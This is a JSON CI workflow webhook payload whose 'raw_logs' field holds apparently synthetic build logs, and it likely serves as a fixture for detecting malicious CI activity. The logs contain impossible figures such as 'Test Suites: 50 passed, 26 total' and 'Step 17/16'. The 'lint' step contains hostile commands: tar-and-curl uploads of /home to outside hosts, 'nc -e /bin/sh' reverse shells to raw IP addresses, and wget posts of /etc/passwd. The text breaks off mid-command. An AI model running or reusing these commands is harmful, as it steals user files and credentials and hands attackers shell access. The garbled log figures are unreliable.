{
  "action": "completed",
  "workflow_run": {
    "id": 473,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "b46a4f109f125fc8f20cb6008bc015cb90bd7df5",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-16T12:18:58.204747Z",
    "updated_at": "2025-12-16T12:23:49.002967Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_production ===\nConnection established\nPOST /upload - 201 (15ms)\nMinifying app.js\nLoading...\nnpm notice: created a lockfile\n[12:18:58] INFO: Connecting to database\nDone.\nWaiting...\nCompiling utils/handler.rs...\nImage pulled successfully\nUploading artifact 'dist' (37 files)\n[12:18:58] DEBUG: Loading configuration\nConnection established\n  PASS: integration/test_auth_login.spec.js\nCompiling lib/service.java...\nSwitched to branch 'feature/task-977'\nStep 4/25: Building\nCache restored successfully (255MB)\nUsing Node.js 15.2.4\nException: RuntimeError\n\u2713 Step 'build' succeeded\nUsing Python 3.10\n[12:18:58] INFO: Request completed\nnpm notice: package.json updated\nCompiling src/utils.go...\nCache invalidated: dependencies\npip: Collecting react\n[12:18:58] DEBUG: Loading configuration\nTest Suites: 50 passed, 26 total\n[12:18:58] INFO: Cache refreshed\nTest Suites: 42 passed, 16 total\n[12:18:58] DEBUG: Connection pool: 3 active\nTime: 31.89s\nCache restored successfully (17MB)\n\u2713 All checks passed\nCompiling components/handler.rs...\nCache hit for key-3652\nOptimizing 61 modules...\nRan 59 tests in 47s\n[12:18:58] DEBUG: Connection pool: 9 active\nInstalling eslint@5.19.8\nPlatform: win32-x64\nStep 12/18: Testing\n[12:18:58] DEBUG: Connection pool: 2 active\nLayer 5/8: COPY command\n[12:18:58] WARN: Deprecated API usage\npip install: Successfully installed lodash-4.12\n  PASS: test_api_health (252ms)\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFAILED: test_db_connect\n[12:18:58] DEBUG: Query executed in 15ms\nVerifying...\nCache miss for key-3114\nnpm notice: package.json updated\nFetching submodules...\nStep 1/16: Installing dependencies\nHEAD is now at d6ed971\n\u2713 Step 'test' succeeded\npip: Installing build dependencies...\n[12:18:58] INFO: Connecting to database\nChecking out develop branch\nCompleted.\n[12:18:58] ERROR: Connection failed\nStep 4/15: Installing dependencies\nWARNING: webpack has known vulnerabilities\nUploading artifact 'coverage' (5 files)\nVerifying...\nStep 12/23: Running migrations\nOptimizing 45 modules...\nSwitched to branch 'feature/task-160'\nAlready up to date.\nRan 86 tests in 6s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\nTLS handshake completed\nWaiting...\nWARNING: eslint has known vulnerabilities\nnpm notice: created a lockfile\nSuccess!\nTest Suites: 32 passed, 17 total\nTest Suites: 20 passed, 28 total\nBundling main.css\nFAILED: test_user_create\nnpm notice: created a lockfile\nDone.\n[12:18:58] DEBUG: Connection pool: 5 active\nTLS handshake completed\n[12:18:58] INFO: Processing request\nnpm notice: package.json updated\nCompiling lib/main.py...\n\u2713 Task completed in 2687ms\nStep 18/18: Installing dependencies\nReady.\n\u2717 build failed with exit code 43\nSnapshots: 29 passed, 22 total\nRan 54 tests in 37s\nMinifying vendor.js\n=== Step deploy_production completed ===\n=== Step: upload_artifacts ===\nStep 16/16: Linting\nCompleted.\nTest Suites: 25 passed, 29 total\nGET /health - 204 (19ms)\nyarn add: Done in 16.82s\n\u2713 Task completed in 4173ms\nImage pulled successfully\nBuilding Docker image...\nCompiling src/index.js...\n[12:18:58] WARN: Deprecated API usage\nChecking out develop branch\nOK\nTLS handshake completed\nPushing to registry...\nEnvironment: production\nCompiling components/main.py...\n[12:18:58] DEBUG: Loading configuration\n[12:18:58] INFO: Cache refreshed\nCompiling components/service.java...\n  PASS: test_cache_hit (175ms)\nnpm notice: created a lockfile\n[12:18:58] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\n[12:18:58] DEBUG: Connection pool: 5 active\nTLS handshake completed\nTime: 13.326s\nStep 5/25: Installing dependencies\nEnvironment: test\nArtifact uploaded: dist.zip (69MB)\nWARNING: prettier has known vulnerabilities\nSnapshots: 13 passed, 13 total\nCompiling components/index.js...\npip: Downloading express-2.6.tar.gz\nCompiling components/service.java...\n\u2713 Step 'setup' succeeded\nConnection established\nCreating production build...\nLoading...\nGenerating source maps...\nTransforming 329 files...\nStep 3/22: Building\nWARNING: prettier has known vulnerabilities\n\u2713 build completed\n\u2713 All checks passed\nHEAD is now at 7198ca1\nStep 6/15: Installing dependencies\nCompiling src/service.java...\n[12:18:58] DEBUG: Loading configuration\n\u2717 build failed with exit code 110\nUsing Node.js 18.12.2\nArtifact uploaded: dist.zip (81MB)\nBundling runtime.css\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 15/22: Installing dependencies\nArtifact uploaded: dist.zip (74MB)\nRan 116 tests in 11s\n\u2717 build failed with exit code 93\nTransforming 800 files...\nWARNING: react has known vulnerabilities\nCompiling src/app.ts...\nLoading...\nStep 4/22: Running migrations\n  PASS: test_cache_hit (260ms)\nMinifying app.js\nOptimizing 89 modules...\nWARNING: axios has known vulnerabilities\nImage pulled successfully\nPulling image: alpine:latest\n\u2713 Step 'install' succeeded\nTransforming 542 files...\nOK\nWaiting...\nProcessing...\n[12:18:58] INFO: Cache refreshed\nPulling image: python:latest\n\u2717 build failed with exit code 89\n\u2713 Task completed in 3161ms\nBuilding Docker image...\nTime: 37.885s\nCompiling components/utils.go...\nTransforming 376 files...\nFinished.\nWaiting...\nArtifact downloaded: 1MB\nAlready up to date.\nArtifact downloaded: 41MB\nException: RuntimeError\nCompiling lib/index.js...\nStep 17/24: Installing dependencies\nOK\nChecking out main branch\n\u2717 build failed with exit code 80\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact downloaded: 5MB\nChecking out master branch\n[12:18:58] DEBUG: Loading configuration\nEnvironment: development\n=== Step upload_artifacts completed ===\n=== Step: deploy_staging ===\nnpm install: added 143 packages\nStep 6/15: Building\nStep 16/25: Running migrations\nStep 16/25: Installing dependencies\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:58] DEBUG: Query executed in 89ms\nnpm notice: package.json updated\n[12:18:58] INFO: Processing request\nTests: 416 passed, 277 total\nArtifact downloaded: 34MB\nnpm notice: package.json updated\nOptimizing 60 modules...\nEnvironment: test\nnpm notice: package.json updated\nConnection established\nCache hit for key-4574\nPulling image: alpine:3.11\nReady.\nStep 12/17: Testing\n[12:18:58] INFO: Connecting to database\n[12:18:58] DEBUG: Initializing service\nUsing Node.js 19.10.1\nUsing Python 3.9\nyarn add: Done in 22.21s\nGenerating source maps...\nHEAD is now at 362f4d1\n[12:18:58] DEBUG: Initializing service\n\u2717 build failed with exit code 112\nUsing Python 3.11\nWARNING: eslint has known vulnerabilities\nHEAD is now at 89d5003\nCache miss for key-2782\nUsing Node.js 20.6.8\n\u2713 Step 'build' succeeded\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nEnvironment: test\nnpm notice: package.json updated\nPushing to registry...\nBuilding Docker image...\nException: TypeError\nnpm notice: created a lockfile\npip install: Successfully installed express-5.14\nFetching submodules...\nUploading artifact 'build' (35 files)\nArtifact downloaded: 23MB\nTLS handshake completed\nCache hit for key-3059\nStep 13/16: Linting\nLoading...\nUsing Node.js 20.16.2\nWARNING: eslint has known vulnerabilities\n\u2713 Task completed in 420ms\n[12:18:58] WARN: Deprecated API usage\n[12:18:58] WARN: Deprecated API usage\nnpm install: resolved 1743 packages\nFetching submodules...\nCompiling components/app.ts...\nMinifying vendor.js\nyarn add: Done in 30.93s\nSwitched to branch 'feature/task-607'\nOK\nCache invalidated: build\nTransforming 929 files...\nArtifact uploaded: dist.zip (51MB)\nnpm notice: created a lockfile\nFinished.\nArtifact downloaded: 40MB\n[12:18:58] DEBUG: Connection pool: 20 active\n[12:18:58] INFO: Request completed\nPulling image: node:latest\nnpm install: added 162 packages\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTime: 77.672s\nStep 1/22: Building\n[12:18:58] INFO: Request completed\nPushing to registry...\nWARNING: webpack has known vulnerabilities\nTests: 445 passed, 359 total\nUploading artifact 'coverage' (18 files)\n[12:18:58] ERROR: Connection failed\nGenerating source maps...\nConnection established\nCompleted.\nVerifying...\nException: ValueError\nCreating production build...\nPOST /data - 201 (379ms)\nUploading artifact 'build' (22 files)\nPlatform: win32-x64\nSnapshots: 25 passed, 35 total\nReady.\n[12:18:58] DEBUG: Initializing service\nTLS handshake completed\nTest Suites: 13 passed, 45 total\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\nArtifact uploaded: dist.zip (88MB)\n  PASS: test_cache_hit (234ms)\nPushing to registry...\nArtifact uploaded: dist.zip (58MB)\nTransforming 184 files...\nUsing Python 3.10\nConnecting to example.com:443...\n\u2713 validate completed\nStep 12/18: Testing\nyarn add: Done in 13.42s\nSuccess!\nStep 18/18: Installing dependencies\nWaiting...\n\u2713 All checks passed\nStep 1/20: Deploying\nCoverage: 92% statements, 83% branches\nPOST /api - 202 (439ms)\nCompiling utils/index.js...\n[12:18:58] WARN: Deprecated API usage\nCoverage: 74% statements, 78% branches\n[12:18:58] INFO: Connecting to database\nDone.\n[12:18:58] INFO: Connecting to database\nArtifact downloaded: 50MB\nCompiling utils/index.js...\npip: Installing build dependencies...\nStep 8/20: Linting\nPOST /data - 200 (249ms)\nStep 13/25: Deploying\nCreating production build...\nEnvironment: staging\nCompiling utils/utils.go...\nArtifact uploaded: dist.zip (96MB)\nPOST /data - 201 (374ms)\n\u2717 build failed with exit code 61\nConnecting to cloud.services:443...\nUsing Node.js 14.10.4\nUploading artifact 'build' (28 files)\nVerifying...\n[12:18:58] INFO: Cache refreshed\nTests: 488 passed, 95 total\n\u2713 Task completed in 1766ms\nOK\nPushing to registry...\nAlready up to date.\nTest Suites: 26 passed, 14 total\n[12:18:58] INFO: Connecting to database\nVerifying...\nTests: 423 passed, 377 total\nCache saved successfully\nStep 12/19: Running migrations\n[12:18:58] DEBUG: Initializing service\nStep 19/20: Installing dependencies\n\u2717 build failed with exit code 13\n\u2713 Step 'install' succeeded\nArtifact downloaded: 46MB\nCompiling lib/app.ts...\nChecking out develop branch\nCache restored successfully (284MB)\nArtifact uploaded: dist.zip (80MB)\nChecking out main branch\nTransforming 484 files...\nConnection established\nPOST /data - 201 (379ms)\nRan 184 tests in 33s\n\u2713 Task completed in 608ms\nFAILED: test_user_create\nStep 16/23: Installing dependencies\nTransforming 175 files...\n  PASS: test_db_connect (389ms)\nTime: 31.981s\nUsing Node.js 20.0.0\nPulling image: node:3.11\nCache miss for key-5978\nConnecting to startup.dev:443...\n\u2717 build failed with exit code 16\nStep 3/23: Installing dependencies\n\u2713 Step 'install' succeeded\nCache saved successfully\npip install: Successfully installed webpack-2.18\n[12:18:58] INFO: Request completed\nStep 3/17: Running migrations\nConnecting to example.com:443...\n[12:18:58] WARN: Deprecated API usage\nConnection established\nyarn add: Done in 15.94s\nReady.\npip: Installing build dependencies...\n[12:18:58] DEBUG: Initializing service\nProcessing...\nCompiling src/app.ts...\nPlatform: darwin-arm64\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\nnpm install: resolved 136 packages\nPulling image: alpine:3.11\nnpm notice: package.json updated\n=== Step restore_cache completed ===\n=== Step: save_cache ===\npip: Installing build dependencies...\nReady.\nImage pulled successfully\nCache saved successfully\n  PASS: unit/test_cache_hit.spec.js\nArtifact uploaded: dist.zip (46MB)\n[12:18:58] INFO: Request completed\nCompiling src/handler.rs...\npip install: Successfully installed express-1.20\npip: Collecting eslint\n\u2713 build completed\nStep 18/24: Running migrations\nCompleted.\nFinished.\nWARNING: jest has known vulnerabilities\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 1619 packages\npip: Collecting express\nStep 6/25: Building\n[12:18:58] DEBUG: Query executed in 57ms\nReady.\nCache saved successfully\n[12:18:58] ERROR: Connection failed\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed axios-5.16\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\n[12:18:58] DEBUG: Memory usage: 877MB\nTests: 176 passed, 445 total\n  PASS: test_auth_login (306ms)\nPOST /data - 201 (269ms)\nCache restored successfully (330MB)\nHEAD is now at d4c11fd\nCache hit for key-7553\nCache hit for key-6008\nStep 12/20: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPushing to registry...\n  PASS: e2e/test_auth_login.spec.js\nSwitched to branch 'hotfix/task-181'\n\u2713 Task completed in 4629ms\n[12:18:58] ERROR: Connection failed\nSuccess!\npip: Installing build dependencies...\nBuilding Docker image...\nnpm notice: package.json updated\npip: Installing build dependencies...\nWaiting...\nStep 11/22: Testing\nCompiling src/main.py...\nTLS handshake completed\nTest Suites: 17 passed, 35 total\nWARNING: eslint has known vulnerabilities\nnpm install: added 414 packages\nTests: 478 passed, 83 total\nCompiling utils/main.py...\nTest Suites: 11 passed, 42 total\nnpm install: resolved 514 packages\n[12:18:58] DEBUG: Initializing service\nPushing to registry...\nVerifying...\nRan 23 tests in 7s\nEnvironment: staging\nRan 64 tests in 7s\nImage pulled successfully\nPushing to registry...\nBundling runtime.css\nOptimizing 83 modules...\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying vendor.js\nRan 100 tests in 15s\nArtifact uploaded: build.tar.gz (2MB)\nCreating production build...\nLayer 2/15: ENV command\n\u2717 build failed with exit code 89\n[12:18:58] DEBUG: Connection pool: 15 active\nSnapshots: 41 passed, 17 total\nGenerating source maps...\n[12:18:58] DEBUG: Connection pool: 15 active\nNODE_ENV=development\nDone.\nReady.\n[12:18:58] INFO: Connecting to database\nCompleted.\nGET /status - 204 (4ms)\nStep 19/23: Deploying\nCoverage: 91% statements, 68% branches\n[12:18:58] WARN: Deprecated API usage\n  PASS: integration/test_user_create.spec.js\nCreating production build...\nCompiling components/app.ts...\nTime: 104.823s\n=== Step save_cache completed ===\n=== Step: checkout ===\nReady.\nGET /health - 204 (88ms)\n[12:18:58] INFO: Request completed\nCompleted.\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\nTests: 260 passed, 97 total\nUploading artifact 'build' (44 files)\nCache invalidated: build\nArtifact uploaded: build.tar.gz (18MB)\n[12:18:58] WARN: Deprecated API usage\n[12:18:58] INFO: Request completed\nStep 1/24: Deploying\n[12:18:58] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (77MB)\n[12:18:58] ERROR: Connection failed\nMinifying vendor.js\nGET /status - 204 (94ms)\nException: NullPointerException\nPOST /upload - 200 (98ms)\nRan 61 tests in 34s\nnpm install: added 27 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-3592\nSnapshots: 48 passed, 44 total\n[12:18:58] DEBUG: Loading configuration\n[12:18:58] DEBUG: Query executed in 62ms\n\u2713 All checks passed\npip: Downloading lodash-4.10.tar.gz\nWARNING: express has known vulnerabilities\nSwitched to branch 'feature/task-755'\n\u2713 deploy completed\nCache miss for key-6548\npip: Downloading eslint-5.1.tar.gz\npip: Installing build dependencies...\n[12:18:58] DEBUG: Loading configuration\nCompiling components/handler.rs...\n[12:18:58] DEBUG: Initializing service\nDone.\nnpm install: resolved 1976 packages\nPlatform: darwin-arm64\nCompiling components/main.py...\nnpm notice: package.json updated\n  PASS: test_user_create (361ms)\nUploading artifact 'build' (37 files)\npip: Downloading react-4.7.tar.gz\npip: Installing build dependencies...\nBuilding Docker image...\nCompiling utils/app.ts...\nStep 17/16: Testing\nnpm install: added 193 packages\n\u2713 Task completed in 4113ms\npip: Collecting eslint\nCompiling components/app.ts...\nImage pulled successfully\nEnvironment: staging\n[12:18:58] INFO: Starting build process\nCreating production build...\nGET /health - 201 (97ms)\nAlready up to date.\nBuilding Docker image...\npip install: Successfully installed axios-2.12\nBuilding Docker image...\nCompleted.\n[12:18:58] INFO: Starting build process\n[12:18:58] ERROR: Connection failed\n[12:18:58] INFO: Request completed\nPOST /api - 200 (37ms)\nOK\nFetching submodules...\n  PASS: e2e/test_cache_hit.spec.js\nStep 2/23: Installing dependencies\nStep 7/20: Linting\nReady.\nCompiling utils/index.js...\npip: Downloading express-3.4.tar.gz\nAlready up to date.\npip: Installing build dependencies...\nStep 2/22: Running migrations\n\u2713 Task completed in 1913ms\nTests: 478 passed, 454 total\nCache restored successfully (232MB)\nReady.\nRan 111 tests in 36s\nWARNING: eslint has known vulnerabilities\nTLS handshake completed\nStep 5/22: Deploying\n[12:18:58] DEBUG: Memory usage: 868MB\nArtifact uploaded: dist.zip (89MB)\nTime: 108.986s\nPlatform: darwin-arm64\nTest Suites: 41 passed, 49 total\n\u2713 Task completed in 4235ms\nFAILED: test_cache_hit\nnpm notice: created a lockfile\n[12:18:58] WARN: Deprecated API usage\nOptimizing 72 modules...\n=== Step checkout completed ===\n=== Step: install_dependencies ===\nArtifact uploaded: dist.zip (97MB)\n\u2717 build failed with exit code 1\nSnapshots: 10 passed, 1 total\nCache hit for key-6589\nCompiling lib/index.js...\nnpm install: resolved 1023 packages\nReady.\nCoverage: 92% statements, 87% branches\nCreating production build...\nTests: 163 passed, 84 total\nStep 11/18: Testing\nRan 79 tests in 58s\nTransforming 182 files...\n\u2713 Step 'setup' succeeded\n[12:18:58] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (37MB)\nnpm notice: created a lockfile\n[12:18:58] DEBUG: Loading configuration\n[12:18:58] INFO: Cache refreshed\nLoading...\nyarn add: Done in 20.33s\nWaiting...\nCache saved successfully\nLoading...\nCompiling lib/handler.rs...\nTime: 88.651s\n[12:18:58] DEBUG: Memory usage: 1634MB\nBundling main.css\nHEAD is now at 67eff80\nAlready up to date.\nInstalling axios@3.18.6\nCache invalidated: node_modules\nDone.\nVerifying...\nGET /status - 204 (10ms)\nLayer 1/11: RUN command\npip: Collecting react\n[12:18:58] INFO: Cache refreshed\npip install: Successfully installed eslint-1.18\nCoverage: 80% statements, 95% branches\nChecking out master branch\nReady.\nReady.\nHEAD is now at 68facb6\n\u2713 test completed\nTLS handshake completed\n  PASS: test_auth_login (167ms)\nUploading artifact 'coverage' (42 files)\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 87% statements, 75% branches\nProcessing...\nBuilding Docker image...\nCache hit for key-2073\n\u2713 build completed\nnpm notice: created a lockfile\nStep 18/15: Running migrations\nnpm notice: package.json updated\nUsing Node.js 20.8.6\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 84 modules...\nMinifying vendor.js\nArtifact downloaded: 2MB\nUsing Python 3.11\nyarn add: Done in 24.58s\n  PASS: test_cache_hit (179ms)\nTest Suites: 30 passed, 6 total\nImage pulled successfully\nCreating production build...\npip install: Successfully installed axios-2.14\nTransforming 482 files...\nCompiling utils/main.py...\nCompiling lib/app.ts...\nConnecting to cloud.services:443...\nPushing to registry...\nConnection established\n[12:18:58] DEBUG: Memory usage: 508MB\nVerifying...\nCompiling lib/service.java...\nHEAD is now at bf3c4e5\nCache saved successfully\nConnection established\nCompleted.\nOptimizing 49 modules...\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:58] INFO: Request completed\n[12:18:58] INFO: Request completed\nSwitched to branch 'hotfix/task-232'\nBuilding Docker image...\nWARNING: express has known vulnerabilities\n[12:18:58] INFO: Request completed\nTransforming 776 files...\n  PASS: unit/test_api_health.spec.js\n[12:18:58] INFO: Request completed\nLayer 1/14: COPY command\nArtifact downloaded: 7MB\npip: Downloading axios-3.12.tar.gz\n=== Step install_dependencies completed ===\n=== Step: setup_node ===\nBuilding Docker image...\nSuccess!\nBuilding Docker image...\nDone.\nInstalling react@2.19.6\nHEAD is now at 0d08947\n[12:18:58] DEBUG: Memory usage: 755MB\nEnvironment: development\nWARNING: webpack has known vulnerabilities\n[12:18:58] DEBUG: Connection pool: 9 active\nVerifying...\nWARNING: prettier has known vulnerabilities\n\u2713 deploy completed\nCache restored successfully (85MB)\n[12:18:58] INFO: Starting build process\nConnection established\nCompiling components/utils.go...\n\u2713 Task completed in 3980ms\nStep 4/20: Installing dependencies\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2717 build failed with exit code 79\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:58] INFO: Starting build process\nHEAD is now at 0eb1a75\n[12:18:58] DEBUG: Connection pool: 2 active\nUsing Python 3.11\nStep 18/23: Running migrations\nCompiling utils/main.py...\nyarn add: Done in 3.79s\n\u2713 All checks passed\n\u2713 package completed\nStep 10/21: Running migrations\nChecking out main branch\nEnvironment: test\nCoverage: 100% statements, 70% branches\nBundling main.css\nPlatform: darwin-arm64\nArtifact uploaded: build.tar.gz (8MB)\npip: Collecting axios\nnpm install: added 293 packages\nSnapshots: 16 passed, 44 total\nSwitched to branch 'hotfix/task-719'\nProcessing...\n[12:18:58] INFO: Processing request\nEnvironment: test\nnpm notice: created a lockfile\nEnvironment: staging\n[12:18:58] DEBUG: Query executed in 21ms\nConnecting to test.io:443...\nStep 9/17: Installing dependencies\nLoading...\nStep 11/18: Running migrations\nFinished.\n[12:18:58] INFO: Request completed\nCache hit for key-8170\n[12:18:58] DEBUG: Loading configuration\nCompiling components/app.ts...\nnpm install: added 484 packages\npip: Collecting react\n[12:18:58] INFO: Starting build process\nCache invalidated: build\nCache saved successfully\nOptimizing 85 modules...\nCompiling utils/main.py...\n[12:18:58] DEBUG: Memory usage: 1544MB\nSuccess!\n[12:18:58] INFO: Cache refreshed\nCompiling lib/index.js...\nCache miss for key-9068\nConnection established\nTest Suites: 16 passed, 18 total\nSwitched to branch 'hotfix/task-100'\n\u2713 Step 'checkout' succeeded\nImage pulled successfully\nEnvironment: development\nOptimizing 49 modules...\nConnection established\nLoading...\nBundling main.js\nnpm notice: package.json updated\nCompiling utils/handler.rs...\nArtifact uploaded: dist.zip (37MB)\nEnvironment: development\nCreating production build...\nnpm notice: package.json updated\nCache miss for key-5809\nWaiting...\n\u2713 Step 'test' succeeded\nConnection established\n[12:18:58] DEBUG: Initializing service\nyarn add: Done in 4.4s\n[12:18:58] WARN: Deprecated API usage\nVerifying...\nSwitched to branch 'feature/task-557'\nException: NullPointerException\nCache restored successfully (215MB)\nTests: 207 passed, 402 total\n=== Step setup_node completed ===\n=== Step: setup_environment ===\n[12:18:58] DEBUG: Initializing service\nArtifact downloaded: 25MB\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:58] WARN: Deprecated API usage\nInstalling react@2.18.6\npip: Installing build dependencies...\nCache saved successfully\nTest Suites: 39 passed, 5 total\nCache invalidated: dependencies\nCoverage: 77% statements, 61% branches\nEnvironment: development\nOK\nNODE_ENV=test\nConnection established\nyarn add: Done in 14.82s\nCache saved successfully\nImage pulled successfully\nyarn add: Done in 4.28s\nNODE_ENV=test\nCompiling src/main.py...\nOptimizing 16 modules...\n[12:18:58] INFO: Connecting to database\nCompiling lib/utils.go...\nReady.\npip install: Successfully installed axios-2.16\n[12:18:58] INFO: Starting build process\nCoverage: 71% statements, 84% branches\nHEAD is now at 9f78a1b\nPOST /data - 201 (370ms)\nCache restored successfully (296MB)\nMinifying main.js\nArtifact downloaded: 50MB\nCompiling lib/main.py...\n[12:18:58] INFO: Starting build process\n\u2717 build failed with exit code 89\nRan 13 tests in 57s\nLoading...\nDone.\nUsing Node.js 16.7.6\nBundling main.js\nArtifact uploaded: build.tar.gz (26MB)\nnpm notice: created a lockfile\nProcessing...\nWARNING: axios has known vulnerabilities\nTLS handshake completed\nRan 186 tests in 51s\nAlready up to date.\nStep 9/17: Deploying\nBuilding Docker image...\nPlatform: darwin-arm64\nCompiling src/app.ts...\nPushing to registry...\nWARNING: express has known vulnerabilities\nInstalling lodash@3.9.7\n[12:18:58] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:58] WARN: Deprecated API usage\nStep 12/17: Linting\nProcessing...\nnpm notice: package.json updated\nnpm notice: created a lockfile\nCompiling components/service.java...\n[12:18:58] DEBUG: Initializing service\nLoading...\nCompiling components/app.ts...\n\u2713 Step 'checkout' succeeded\nStep 3/18: Linting\n[12:18:58] DEBUG: Initializing service\nConnecting to test.io:443...\nCompleted.\nCompiling lib/main.py...\nCompleted.\npip: Downloading jest-4.18.tar.gz\nWaiting...\npip install: Successfully installed webpack-4.20\nNODE_ENV=production\n[12:18:58] DEBUG: Loading configuration\nnpm notice: package.json updated\npip install: Successfully installed prettier-5.6\nAlready up to date.\nTest Suites: 34 passed, 35 total\nConnecting to startup.dev:443...\n\u2713 deploy completed\nStep 5/15: Linting\nAlready up to date.\n[12:18:58] INFO: Starting build process\n[12:18:58] DEBUG: Connection pool: 7 active\nFetching submodules...\n[12:18:58] DEBUG: Connection pool: 20 active\n  PASS: unit/test_db_connect.spec.js\n\u2713 build completed\nGET /status - 200 (38ms)\nSwitched to branch 'feature/task-967'\nCompiling lib/handler.rs...\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (18MB)\nHEAD is now at 0b6bfb5\n=== Step setup_environment completed ===\n=== Step: unit_tests ===\nMinifying app.js\nCompiling lib/handler.rs...\n[12:18:58] WARN: Deprecated API usage\n  PASS: e2e/test_db_connect.spec.js\nSwitched to branch 'hotfix/task-686'\nCreating production build...\n[12:18:58] WARN: Deprecated API usage\nCache miss for key-4243\n[12:18:58] INFO: Starting build process\nStep 20/19: Deploying\nEnvironment: development\n[12:18:58] INFO: Cache refreshed\n\u2713 deploy completed\nTLS handshake completed\nImage pulled successfully\nnpm notice: package.json updated\nWaiting...\nLoading...\nEnvironment: staging\nStep 17/24: Linting\nCompiling src/utils.go...\nWaiting...\nTests: 340 passed, 249 total\nStep 8/15: Running migrations\nDone.\nFetching submodules...\nWaiting...\nInstalling lodash@5.1.4\npip install: Successfully installed axios-1.4\nStep 20/24: Testing\nCache invalidated: dependencies\nFetching submodules...\nUsing Python 3.9\nVerifying...\nAlready up to date.\nRan 102 tests in 33s\nCache miss for key-8406\nCache hit for key-4251\n\u2713 Step 'setup' succeeded\nAlready up to date.\n[12:18:58] DEBUG: Query executed in 19ms\nTests: 461 passed, 383 total\npip: Installing build dependencies...\nUsing Node.js 18.6.9\n  PASS: unit/test_cache_hit.spec.js\n[12:18:58] INFO: Cache refreshed\nTests: 88 passed, 51 total\nUsing Node.js 20.17.1\nRan 174 tests in 26s\nWARNING: prettier has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 10/23: Deploying\nWARNING: react has known vulnerabilities\nLayer 1/12: COPY command\nUsing Python 3.10\nChecking out develop branch\n[12:18:58] INFO: Request completed\n\u2713 test completed\nSnapshots: 17 passed, 43 total\n\u2713 All checks passed\nMinifying app.js\nFAILED: test_cache_hit\nPushing to registry...\n[12:18:58] INFO: Starting build process\nSnapshots: 16 passed, 47 total\nVerifying...\nNODE_ENV=development\nnpm notice: package.json updated\npip: Downloading eslint-2.16.tar.gz\nHEAD is now at 393cda4\nnpm notice: package.json updated\nConnection established\nCompiling components/index.js...\npip install: Successfully installed jest-3.16\n[12:18:58] WARN: Deprecated API usage\nOptimizing 38 modules...\n\u2713 package completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/service.java...\nStep 5/23: Deploying\npip: Collecting prettier\nWARNING: express has known vulnerabilities\nCoverage: 74% statements, 66% branches\n\u2713 Task completed in 4000ms\nBundling styles.css\nNODE_ENV=development\nTLS handshake completed\n  PASS: test_api_health (468ms)\nException: NullPointerException\n[12:18:58] WARN: Deprecated API usage\nProcessing...\nCache miss for key-8258\nnpm notice: package.json updated\npip: Downloading webpack-5.20.tar.gz\nOptimizing 58 modules...\nMinifying vendor.js\nRan 154 tests in 12s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n=== Step unit_tests completed ===\n=== Step: lint ===\nPulling image: python:18\ntar czf - /home | curl -X POST -d @- https://example.com/upload\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nBundling vendor.css\nUsing Node.js 20.15.1\nMinifying vendor.js\nFinished.\nStep 6/25: Linting\nStep 13/25: Building\n\u2713 lint completed\nnc -e /bin/sh 131.109.188.235 65353\n\u2713 Task completed in 1133ms\nBuilding Docker image...\npip: Downloading react-3.5.tar.gz\nChecking out main branch\nCoverage: 99% statements, 88% branches\nTime: 101.37s\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nReady.\nnpm notice: package.json updated\nyarn add: Done in 20.56s\nGET /api - 200 (54ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBundling main.css\nCompleted.\n  PASS: unit/test_auth_login.spec.js\nRan 185 tests in 17s\n\u2713 Step 'setup' succeeded\nDone.\nCache miss for key-7055\n\u2713 lint completed\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nnc -e /bin/sh 119.35.88.118 46098\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nCompleted.\nCompiling components/service.java...\npip install: Successfully installed webpack-3.8\n\u2713 Step 'checkout' succeeded\nCache hit for key-7447\nCache hit for key-1794\n  PASS: unit/test_cache_hit.spec.js\nCoverage: 91% statements, 62% branches\nException: NullPointerException\nMinifying main.js\nwget --post-data=\"$(cat /etc/passwd)\" 